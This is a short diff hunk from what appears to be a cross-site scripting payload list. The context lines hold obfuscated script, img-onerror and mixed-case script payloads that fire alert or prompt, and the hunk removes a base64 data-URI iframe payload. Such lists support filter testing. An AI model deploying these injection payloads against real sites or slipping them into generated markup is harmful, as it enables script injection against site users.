@@ -13,7 +13,6 @@
 <script/&Tab; src='https://github.com' /&Tab;></script>
 <img src=`%00`&NewLine; onerror=alert(1)&NewLine;
 <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
-<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
 
 
 
